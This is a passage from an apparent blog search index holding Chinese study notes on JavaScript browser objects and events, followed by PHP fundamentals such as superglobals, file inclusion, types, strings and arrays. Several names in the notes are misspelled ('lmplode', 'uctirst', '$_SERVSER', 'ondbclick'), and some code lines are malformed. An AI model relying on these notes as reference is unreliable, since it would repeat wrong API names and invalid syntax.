class="line"><span class="comment">// 与在浏览器点击后退按钮相同</span></span><br><span class="line">history.<span class="title function_">back</span>()</span><br><span class="line"><span class="comment">// 跳到浏览历史的第n项</span></span><br><span class="line">history.<span class="title function_">go</span>(n)</span><br><span class="line">history.<span class="title function_">go</span>(-<span class="number">1</span>); <span class="comment">// 回到上一页面</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="5-navigator"><a href="#5-navigator" class="headerlink" title="5 navigator"></a>5 navigator</h3><blockquote><p>获得浏览器的信息。</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    txt = <span class="string">&quot;&lt;p&gt;浏览器代号: &quot;</span> + navigator.<span class="property">appCodeName</span> + <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    txt+= <span class="string">&quot;&lt;p&gt;浏览器名称: &quot;</span> + navigator.<span class="property">appName</span> + <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    txt+= <span class="string">&quot;&lt;p&gt;浏览器版本: &quot;</span> + navigator.<span class="property">appVersion</span> + <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    txt+= <span class="string">&quot;&lt;p&gt;启用Cookies: &quot;</span> + navigator.<span class="property">cookieEnabled</span> + <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    txt+= <span class="string">&quot;&lt;p&gt;硬件平台: &quot;</span> + navigator.<span class="property">platform</span> + <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    txt+= <span class="string">&quot;&lt;p&gt;用户代理: &quot;</span> + navigator.<span class="property">userAgent</span> + <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    txt+= <span class="string">&quot;&lt;p&gt;用户代理语言: &quot;</span> + navigator.<span class="property">language</span> + <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(txt);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="七、事件"><a href="#七、事件" class="headerlink" title="七、事件"></a>七、事件</h2><h3 id="1-鼠标点击事件"><a href="#1-鼠标点击事件" class="headerlink" title="1 鼠标点击事件"></a>1 鼠标点击事件</h3><div class="table-container"><table><thead><tr><th>事件名</th><th>描述</th></tr></thead><tbody><tr><td>onclick</td><td>单机鼠标左键时触发</td></tr><tr><td>ondbclick</td><td>双击鼠标左键时触发</td></tr><tr><td>onmousedown</td><td>鼠标任意键按下时触发</td></tr><tr><td>onmouseup</td><td>松开鼠标任意按键时触发</td></tr><tr><td>onmouseover</td><td>鼠标指针移动到元素上时触发</td></tr><tr><td>onmouseout</td><td>鼠标指针移出元素边界时触发</td></tr><tr><td>onmousemove</td><td>鼠标指针在元素上移动时持续触发</td></tr></tbody></table></div><h3 id="2-html事件"><a href="#2-html事件" class="headerlink" title="2 html事件"></a>2 html事件</h3><div class="table-container"><table><thead><tr><th>事件名</th><th>描述</th></tr></thead><tbody><tr><td>onload</td><td>页面完全加载后再 window 对象上触发，图片加载完成后在其上触发</td></tr><tr><td>onunload</td><td>页面完全加载后再 window 对象上触发，图片卸载完成后在其上触发</td></tr><tr><td>onerror</td><td>脚本出错时再 window 对象上触发，图像无法载入时在其上触发</td></tr><tr><td>onselect</td><td>选择了文本框的某些字符或下拉列表框的某项后触发</td></tr><tr><td>onchange</td><td>文本框或下拉框内容改变时触发</td></tr><tr><td>onsubmit</td><td>表单提交时在 form 上触发</td></tr><tr><td>onblur</td><td>任何元素或窗口失去焦点时触发</td></tr><tr><td>onfocus</td><td>任何元素或窗口获得焦点时触发</td></tr><tr><td>onscroll</td><td>浏览器的滚动条滚动时触发</td></tr></tbody></table></div><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--点击后执行检测函数，通过可以return true来提交表单，否则return false来阻止表单提交--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return check();&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="八、其他"><a href="#八、其他" class="headerlink" title="八、其他"></a>八、其他</h2><h3 id="1-游戏"><a href="#1-游戏" class="headerlink" title="1 游戏"></a>1 游戏</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/313050656">低于13kB的10个惊人的JavaScript游戏 - 知乎 (zhihu.com)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web前端 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP</title>
      <link href="/posts/c036635b.html"/>
      <url>/posts/c036635b.html</url>
      
        <content type="html"><![CDATA[<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><hr><h2 id="一、服务器知识"><a href="#一、服务器知识" class="headerlink" title="一、服务器知识"></a>一、服务器知识</h2><ul><li><p>基础知识</p><blockquote><p><a href="https://www.bccn.net/run/">在线编程</a></p><p><a href="https://www.w3.org/">official::W3C</a>：制定规范。</p><p><a href="http://info.cern.ch/">全网第一个网页</a></p></blockquote></li><li><p>浏览器（表格）</p></li></ul><div class="table-container"><table><thead><tr><th><strong>传统内核</strong></th><th><strong>对应浏览器</strong></th><th><strong>新内核</strong></th></tr></thead><tbody><tr><td>Trident</td><td>IE</td><td></td></tr><tr><td>T+W（双核）</td><td>搜狗，360，遨游</td><td></td></tr><tr><td>Webkit</td><td>Safari</td><td></td></tr><tr><td>Webkit</td><td>Chrome</td><td>Blink（微信小程序内核）</td></tr><tr><td>Presto</td><td>Opera</td><td>Blink</td></tr><tr><td>Gecko</td><td>Firefox</td><td>Servo</td></tr></tbody></table></div><ul><li><p>其他知识</p><ul><li>C/S（胖客户端），B/S（瘦客户端）</li><li>PWA：Progressive web app</li><li>浏览器 flash 默认关闭。</li><li>服务端技术：CGI，PHP，ASP，JSP，<a href="http://asp.net/">ASP.NET</a></li><li>MIME（多用途网际邮件扩充协议）：是一种标准，用来表示文档、文件或字节流的性质和格式。    <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME</a></li></ul></li></ul><hr><h2 id="二、PHP语言基础"><a href="#二、PHP语言基础" class="headerlink" title="二、PHP语言基础"></a>二、PHP语言基础</h2><blockquote><p><a href="https://www.php.net/">official::PHP: Hypertext Preprocessor</a></p></blockquote><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1 定义"></a>1 定义</h3><blockquote><p>PHP是一种运行在服务器端的脚本语言，可以嵌入到 HTML 中。</p></blockquote><ul><li><p>标记方式：</p><ul><li>ASP标记：<code>&lt;% code %&gt;</code></li><li>短标记：<code>&lt;? code ?&gt;</code>（“&lt;?=”是PHP的一个短的开放式标签，是echo() 的快捷用法。）</li><li>脚本标记：<code>&lt;script language=&quot;php&quot;&gt;code&lt;/script&gt;</code></li><li>标准标记（常用）：<code>&lt;?php code ?&gt;</code></li></ul><blockquote><p> 前两种基本弃用，开启：php.ini——short_open_tag / asp_tags</p></blockquote></li><li><p>注释</p><blockquote><p> 行：// # ，块：/<em> </em>/</p></blockquote></li><li><p>语句间用 ; 隔开，?&gt;会自带所以最后一个语句不用。</p><p>注：<code>&lt;?php code ?&gt;</code>使用时可以不写 ?&gt;，这样后面的空行都会解析成php而不是html，从而节约行数。</p></li></ul><h3 id="2-变量与常量"><a href="#2-变量与常量" class="headerlink" title="2 变量与常量"></a>2 变量与常量</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="variable">$var</span>;</span><br><span class="line"><span class="comment">// 赋值</span></span><br><span class="line"><span class="variable">$var</span> = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 删除</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$var</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 超全局变量：系统定义的变量（如：预定义变量）</span></span><br><span class="line"><span class="comment">// 预定义变量：提前定义的变量，系统定义的变量，存储许多需要用到的数据（预定义变量都是数组）。</span></span><br><span class="line"><span class="variable">$_GET</span> <span class="comment">// 获取所有以 get 方式提交的数据的表单</span></span><br><span class="line"><span class="variable">$_POST</span> <span class="comment">// 获取 post 提交的数据</span></span><br><span class="line"><span class="variable">$_REQUEST</span> <span class="comment">// get、post和cookie的（重名不同服务器处理情况不同，一般不用）</span></span><br><span class="line"><span class="variable">$GLOBALS</span> <span class="comment">// PHP中所有的全局变量</span></span><br><span class="line"><span class="variable">$_SERVSER</span> <span class="comment">// 服务器信息</span></span><br><span class="line"><span class="variable">$_SESSION</span> <span class="comment">// session 会话数据</span></span><br><span class="line"><span class="variable">$_COOKIE</span> <span class="comment">// cookie 会话数据</span></span><br><span class="line"><span class="variable">$_ENV</span> <span class="comment">// 环境信息</span></span><br><span class="line"><span class="variable">$_FILES</span> <span class="comment">// 用户上传的文件信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 有趣案例</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;b&#x27;</span>; <span class="variable">$b</span> = <span class="string">&#x27;abc&#x27;</span>; <span class="keyword">echo</span> <span class="variable">$$a</span> == <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常量（不要$，否则会认为成变量）</span></span><br><span class="line"><span class="comment">//1、可以定义特殊字符，例：define( &quot;-_-&quot; , &quot;smile&quot; )，参数三表示对大小写敏感，默认 false 不敏感 </span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;name&quot;</span>,value[,<span class="literal">false</span>]);</span><br><span class="line"><span class="comment">//2、5.3之后才有</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">name</span> = value;</span><br><span class="line"></span><br><span class="line"><span class="comment">//系统常量</span></span><br><span class="line">PHP_VERSION <span class="comment">// PHP版本号。</span></span><br><span class="line">PHP_INT_SIZE <span class="comment">// 整形大小。</span></span><br><span class="line">PHP_INT_MAX <span class="comment">// 整形能表示的最大值。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//魔术常量：随环境变化，用户无法改变。</span></span><br><span class="line"><span class="keyword">__DIR__</span> <span class="comment">// 当前被执行的脚本所在电脑的绝对路径。</span></span><br><span class="line"><span class="keyword">__FILE__</span> <span class="comment">// 当前被执行的脚本所在电脑的绝对路径。（带自己文件的名字）</span></span><br><span class="line"><span class="keyword">__LINE__</span> <span class="comment">// 当前所属的行数。</span></span><br><span class="line"><span class="keyword">__NAMESPACE__</span> <span class="comment">// 当前所属的命名空间。</span></span><br><span class="line"><span class="keyword">__CLASS__</span> <span class="comment">// 当前所属的类。</span></span><br><span class="line"><span class="keyword">__METHOD__</span> <span class="comment">// 当前所属的方法。</span></span><br><span class="line"><span class="keyword">__FUNCTION__</span> <span class="comment">// 当前函数名字</span></span><br></pre></td></tr></table></figure><h3 id="3-内存"><a href="#3-内存" class="headerlink" title="3 内存"></a>3 内存</h3><ul><li><p><strong>区域</strong></p><ul><li>栈区：程序可以操作的内存部分（不存数据，运行程序代码)，少但是快。</li><li>代码段：存储程序的内存部分（不执行)。</li><li>数据段：存储普通数据（全局区和静态区）。</li><li>堆区：存储复杂数据，大但是效率低。</li></ul></li><li><p><strong>传递</strong></p><ul><li>值传递：$a = $b ; ，在数据段重新生成数据。</li><li>引用传递：<code>$a = &amp;$b ;</code> ，地址传递。</li></ul></li></ul><h3 id="4-文件包含"><a href="#4-文件包含" class="headerlink" title="4 文件包含"></a>4 文件包含</h3><blockquote><p>在一个PHP脚本中去将另一个文件包含进来。（同C的 include）</p></blockquote><ul><li><p>文件包含的意义：</p><ol><li>要么使用被包含文件中的内容，实现代码的共享（重用)：向上包含（索要）<blockquote><p>向上包含：在当前脚本要用某个代码之前包含别的文件。</p></blockquote></li><li>要么自己有东西可以给别的文件使用，实现代码的共享(重用)：向下包含(给予)。<blockquote><p>向下包含：在自己有某个东西的时候，需要别的脚本来显示(自己代码写完之后包含其他文件)。</p></blockquote></li><li>最大的作用：分工协作，每个脚本做的事情不一样，因此可以使用协作方式，让多个脚本共同完成一件事情。</li></ol></li><li><p>在PHP中文件的包含有四种形式（两种大形式）</p><ul><li>lnclude：包含文件。</li><li>Include_once：系统会自动判断文件包含过程中，是否已经包含过（一个文件最多被包含一次)。</li><li>Require：与include相同</li><li>Require_once：与include_once相同</li></ul></li><li><p>包含：<code>Include &#39; file &#39; 或 Include( &#39; file &#39; );</code></p><blockquote><p>Include与Require：本质一样，但Include报错是Warning，不影响后面可执行代码的执行；而Require报错是Fatal error，后面语句将不会执行。</p></blockquote></li><li><p>PHP代码的执行流程：</p><ol><li>读取代码文件。(PHP程序)</li><li>编译:将PHP代码转换成字节码。（生成opcode) </li><li>zendengine来解析opcode，按照字节码去进行逻辑运算。</li><li>转换成对应的HTML代码。</li></ol></li><li><p>文件加载原理：</p><ol><li>在文件加载（ include 或者require〉的时候，系统会自动的将被包含文件中的代码相当于嵌入到当前文件中</li><li>加载位置：在哪加载，对应的文件中的代码嵌入的位置就是对应的include位置</li><li>在PHP中被包含的文件是单独进行编译的。<blockquote><p>PHP文件在编译的过程中如果出现了语法错误，那么会失败〈不会执行)；但是如果被包含文件有错误的时候，系统会在执行到包含include这条语句的时候才会报错。<br>注意路径：相对路径指的是当前执行文件下的路径（多次包含文件时可能会失效），可以用”file/file.php”而非”./file/file.php”。</p></blockquote></li></ol></li></ul><h3 id="5-数据类型"><a href="#5-数据类型" class="headerlink" title="5 数据类型"></a>5 数据类型</h3><blockquote><p>PHP是一种弱类型语言，变量本身没有数据类型。</p><p>区分：三大类八小类。</p></blockquote><ul><li>简单（基本）数据类型：4个小类。<ul><li>整型：int/integer，系统分配4个字节存储，表示整数类型。（有前提）</li><li>浮点型：float/double，系统分配8个字节存储，表示小数或者整型存不下的整数。</li><li>字符串型: string，系统根据实际长度分配，表示字符串。（引号）</li><li>布尔类型：bool/boolean，表示布然类型，只有两个值: true和 false。</li></ul></li><li>复合数据类型：2个小类。<ul><li>对象类型：object，存放对象。（面向对象）</li><li>数组类型: array，存储多个数据。（一次性）</li></ul></li><li>特殊数据类型：2个小类。<ul><li>资源类型：resource，存放资源数据。（PHP外部数据，如数据库、文件)</li><li>空类型：NULL，只有一个值就是NULL。(不能运算）</li></ul></li></ul><blockquote><p>类型转化：自动，手动<code>(int)$a</code></p></blockquote><ul><li>字符串转数字<ol><li>以字母开头的字符串，永远为0。</li><li>以数字开头的字符串，取到碰到字符串为止。（不会同时包含两个小数点)</li></ol></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 类型判断</span></span><br><span class="line"><span class="title function_ invoke__">is_type</span>( <span class="variable">$name</span> );</span><br><span class="line"><span class="comment">// 类型查看</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="variable">$one</span> , <span class="variable">$two</span> , ... );</span><br><span class="line"><span class="comment">// 获得类型，返回的是字符串</span></span><br><span class="line"><span class="title function_ invoke__">Gettype</span>( <span class="variable">$name</span> );</span><br><span class="line"><span class="comment">// 转化类型。</span></span><br><span class="line"><span class="title function_ invoke__">Settype</span>( <span class="variable">$name</span> , type );</span><br><span class="line">————————————————————</span><br><span class="line"><span class="comment">// 八进制：0num（输出时系统会自动转化成十进制），其他同C。</span></span><br><span class="line"><span class="comment">// bin：二，oct：八，dec：十，hex：十六。</span></span><br><span class="line"><span class="title function_ invoke__">Decbin</span>(); <span class="comment">//十转二</span></span><br><span class="line"><span class="title function_ invoke__">Bindec</span>(); <span class="comment">//二转十</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断数为空</span></span><br><span class="line"><span class="title function_ invoke__">Empty</span>();</span><br><span class="line"><span class="comment">// 判断数存在</span></span><br><span class="line"><span class="title function_ invoke__">Isset</span>();</span><br></pre></td></tr></table></figure><h3 id="6-运算符"><a href="#6-运算符" class="headerlink" title="6 运算符"></a>6 运算符</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 运算符大部分同理 c</span></span><br><span class="line"><span class="comment">// 数值判断</span></span><br><span class="line">== / !=</span><br><span class="line"><span class="comment">// 数值和类型判断</span></span><br><span class="line">=== / !==</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 连接运算符</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$a</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="comment">// 上面字符串$a$b拼接后赋值给$a，也可以写成下面 </span></span><br><span class="line"><span class="variable">$a</span> .= <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误抑制符：在语句前加 @ ，出错将不会报错</span></span><br><span class="line">@<span class="keyword">if</span>(<span class="number">0</span>/<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="7-输入输出"><a href="#7-输入输出" class="headerlink" title="7 输入输出"></a>7 输入输出</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 输出一个或多个语句或变量。（不能输出bool判断，数组，类等）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;html&quot;</span>,str,...; </span><br><span class="line"><span class="comment">// 特殊常量的输出。（例：&quot;-_-&quot;）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">constant</span>( <span class="string">&quot;str&quot;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示数值，可用于类。</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(obj);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示数值和类型。</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(obj);</span><br></pre></td></tr></table></figure><h3 id="8-判断"><a href="#8-判断" class="headerlink" title="8 判断"></a>8 判断</h3><blockquote><p>同C<br>endif，endswitch</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一定要用三等于，否则找到位置为0时一样是false。</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)=== <span class="literal">false</span>)</span><br><span class="line">&#123; <span class="keyword">echo</span> <span class="string">&#x27;没有找到&#x27;</span>;&#125;</span><br></pre></td></tr></table></figure><h3 id="9-循环"><a href="#9-循环" class="headerlink" title="9 循环"></a>9 循环</h3><blockquote><p>同C++<br>endwhile（没有dowhile），endforeach<br>为了美观可以把 for的<br> <strong>{</strong>  替换成  <strong>:</strong><br> <strong>} </strong> 替换成  <strong>endfor</strong></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 下面两者等价</span></span><br><span class="line"><span class="keyword">for</span>( ;; ) &#123;&#125;</span><br><span class="line"><span class="keyword">for</span>( ;; ): <span class="keyword">endfor</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// foreach 遍历值</span></span><br><span class="line"><span class="keyword">foreach</span>( <span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$v</span> )</span><br><span class="line"><span class="keyword">foreach</span>( <span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span> )</span><br></pre></td></tr></table></figure><h3 id="10-字符串"><a href="#10-字符串" class="headerlink" title="10 字符串"></a>10 字符串</h3><ul><li><p>单双引号</p><ul><li>单引号：不解释，直接输出。</li><li>双引号：变量解释后输出。</li></ul></li><li><p>结构化字符串</p><blockquote><p>会保持原有结构，所有东西都是字符串。（要识别变量应当加引号）</p><p>如：<code>&quot;$a&quot;</code></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// limit：边界符，首尾应当一致，首尾后不跟东西，尾必须顶格。</span></span><br><span class="line"><span class="comment">// nowdoc字符串：没有单引号的单引号字符串。</span></span><br><span class="line"><span class="variable">$str</span> = &lt;&lt;&lt; <span class="string">&quot;limit&quot;</span> </span><br><span class="line">...</span><br><span class="line">limit;</span><br><span class="line"></span><br><span class="line"><span class="comment">// heredoc字符串：没有双引号的双引号字符串。</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&lt;&lt;&lt; limit</span></span><br><span class="line"><span class="string">str</span></span><br><span class="line"><span class="string">limit</span>;</span><br></pre></td></tr></table></figure></li><li><p>字符串函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 字符串长度</span></span><br><span class="line"><span class="title function_ invoke__">strlen</span>();</span><br><span class="line"><span class="comment">// 扩展（去除分号）</span></span><br><span class="line">extension = php_mbstring.dll;</span><br><span class="line"><span class="comment">// 按字符编码计算字符串长度</span></span><br><span class="line"><span class="title function_ invoke__">mb_strlen</span>(<span class="variable">$str</span>,[ encoding ]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串函数</span></span><br><span class="line"><span class="comment">// 将数组中的元素按照某个规则连接成一个字符串。</span></span><br><span class="line"><span class="title function_ invoke__">lmplode</span>(exp,<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 将字符串按照某个格式进行分割，变成数组。</span></span><br><span class="line"><span class="title function_ invoke__">Explode</span>(<span class="variable">$c</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">//按照指定长度拆分字符串得到数组</span></span><br><span class="line"><span class="title function_ invoke__">Str_split</span>(<span class="variable">$str</span>,len);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 去除两边指定字符（还有 Ltrim，Rtrim）</span></span><br><span class="line"><span class="title function_ invoke__">Trim</span>(<span class="variable">$str</span>,[,<span class="variable">$c</span>]);</span><br><span class="line"><span class="comment">// 指定位置开始截取字符串，可以截取指定长度。（不指定到最后）</span></span><br><span class="line"><span class="title function_ invoke__">Substr</span>(<span class="variable">$str</span>,start[,len]);</span><br><span class="line"><span class="comment">// 从指定位置开始，输出 c 在 str 出现的一个位置后面的字符串</span></span><br><span class="line"><span class="title function_ invoke__">Strstr</span>(<span class="variable">$str</span>,<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全部小写</span></span><br><span class="line"><span class="title function_ invoke__">Strtolower</span>($str<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">// 全部大写</span></span><br><span class="line"><span class="title function_ invoke__">Strtoupper</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">// 首字母大写</span></span><br><span class="line"><span class="title function_ invoke__">uctirst</span>(<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// find在str中首次出现的位置，起始位置0</span></span><br><span class="line"><span class="title function_ invoke__">Strpos</span>(<span class="variable">$str</span>,find,[start]); </span><br><span class="line"><span class="comment">// 查找find在str最后一次出现的位置</span></span><br><span class="line"><span class="title function_ invoke__">Strrpos</span>(<span class="variable">$str</span>,find,[start]);</span><br><span class="line"><span class="comment">//（以下查找不区分大小写）</span></span><br><span class="line"><span class="comment">// 查找find在str首次出现的位置</span></span><br><span class="line"><span class="title function_ invoke__">stripos</span>(<span class="variable">$str</span>,find,[start]);</span><br><span class="line"><span class="comment">// 查找find在str最后一次出现的位置</span></span><br><span class="line"><span class="title function_ invoke__">strripos</span>(<span class="variable">$str</span>,find,[start]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将str中的find替换成replace，可替换count处</span></span><br><span class="line"><span class="title function_ invoke__">Str_replace</span>(find,replace,<span class="variable">$str</span>,[&amp;count]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 格式化输出（同c）</span></span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;%d&quot;</span>,num);</span><br><span class="line"><span class="comment">// 把格式化的字符串写入变量中</span></span><br><span class="line"><span class="variable">$info</span> = <span class="string">&#x27;age:%d&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">sprintf</span>(<span class="variable">$info</span>,num);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重复某个字符串N次</span></span><br><span class="line"><span class="title function_ invoke__">Str_repeat</span>(<span class="variable">$str</span>,N);</span><br><span class="line"><span class="comment">// 随机打乱字符串</span></span><br><span class="line"><span class="title function_ invoke__">Str_shuffle</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把str中对应字符转换为 HTML 实体</span></span><br><span class="line"><span class="title function_ invoke__">htmlentities</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">// 剥去str中的 HTML 标签</span></span><br><span class="line"><span class="title function_ invoke__">strip_tags</span>(<span class="variable">$str</span>);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 在预定义字符之前添加反斜杠</span></span><br><span class="line"><span class="title function_ invoke__">addslashes</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">// 删除由 addslashes() 函数添加的反斜杠</span></span><br><span class="line"><span class="title function_ invoke__">stripslashes</span>(<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure></li></ul><h3 id="11-数组"><a href="#11-数组" class="headerlink" title="11 数组"></a>11 数组</h3><ul><li>不填下标默认从最大数字下标向后加。</li><li>下标所有都是整数：索引数组。</li><li>下标所有都是字符串：关联数组。</li><li>下标混合：混合数组。</li><li>true，false，null 自动变成 1，0，” “。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义数组（类似 js）</span></span><br><span class="line"><span class="variable">$name</span> = <span class="keyword">array</span>( elem1 , elem2 , ... );</span><br><span class="line"><span class="variable">$name</span> = [ elem1 , elem2 , ... ];</span><br><span class="line"><span class="variable">$name</span>[] = value1;</span><br><span class="line"><span class="variable">$name</span>[ index ] = value;</span><br><span class="line"><span class="comment">// 定义关联数组</span></span><br><span class="line"><span class="variable">$name</span> = <span class="keyword">array</span>( <span class="string">&#x27;index&#x27;</span> =&gt; <span class="string">&#x27;value&#x27;</span> , ... )</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下标不动，顺序/逆序排序</span></span><br><span class="line"><span class="title function_ invoke__">sort</span>(<span class="variable">$arr</span>); / <span class="title function_ invoke__">rsort</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 下标跟随，顺序/逆序排序</span></span><br><span class="line"><span class="title function_ invoke__">asort</span>(<span class="variable">$arr</span>); / <span class="title function_ invoke__">arsort</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 按键名排序</span></span><br><span class="line"><span class="title function_ invoke__">ksort</span>(<span class="variable">$arr</span>); / <span class="title function_ invoke__">krsort</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 随机打乱</span></span><br><span class="line"><span class="title function_ invoke__">shuffle</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 指针置首/尾</span></span><br><span class="line"><span class="title function_ invoke__">reset</span>(<span class="variable">$arr</span>); / <span class="title function_ invoke__">end</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 指针下移/上移并返回上一/下一元素值</span></span><br><span class="line"><span class="title function_ invoke__">next</span>(<span class="variable">$arr</span>); / <span class="title function_ invoke__">prev</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 获得当前元素值/键</span></span><br><span class="line"><span class="title function_ invoke__">current</span>(<span class="variable">$arr</span>); / <span class="title function_ invoke__">key</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 注意：指针移动超过数组后不能用 next 和 prev 调整指针位置，要用 reset 和 end。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组长</span></span><br><span class="line"><span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 最大最小</span></span><br><span class="line"><span class="title function_ invoke__">max</span>(<span class="variable">$arr</span>);<span class="title function_ invoke__">min</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 往数组中加入一个元素（数组后面）</span></span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="keyword">array</span> &amp;<span class="variable">$array</span>,<span class="keyword">mixed</span> <span class="variable">$var</span>[, <span class="keyword">mixed</span> $... ]);</span><br><span class="line"><span class="comment">// 从数组中取出一个元素（数组后面）</span></span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 从数组中加入一个元素（数组前面）</span></span><br><span class="line"><span class="title function_ invoke__">array_unshift</span>(<span class="keyword">array</span> &amp;<span class="variable">$array</span>,<span class="keyword">mixed</span> <span class="variable">$var</span>[, <span class="keyword">mixed</span> $... ]);</span><br><span class="line"><span class="comment">// 从数组中取出一个元素（数组前面）</span></span><br><span class="line"><span class="title function_ invoke__">array_shift</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 统计所有元素的和</span></span><br><span class="line"><span class="title function_ invoke__">array_sum</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 统计数组中所有值出现的个数</span></span><br><span class="line"><span class="title function_ invoke__">array_count_values</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 数组元素逆转</span></span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 把一个或多个数组合并为一个数组</span></span><br><span class="line"><span class="title function_ invoke__">array_merge</span>(<span class="variable">$arr1</span>,[,<span class="variable">$arr2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断arr中是否存在指定的key</span></span><br><span class="line"><span class="title function_ invoke__">array_key_exists</span>(key,<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 判断str值在arr中，type是否需要类型相同</span></span><br><span 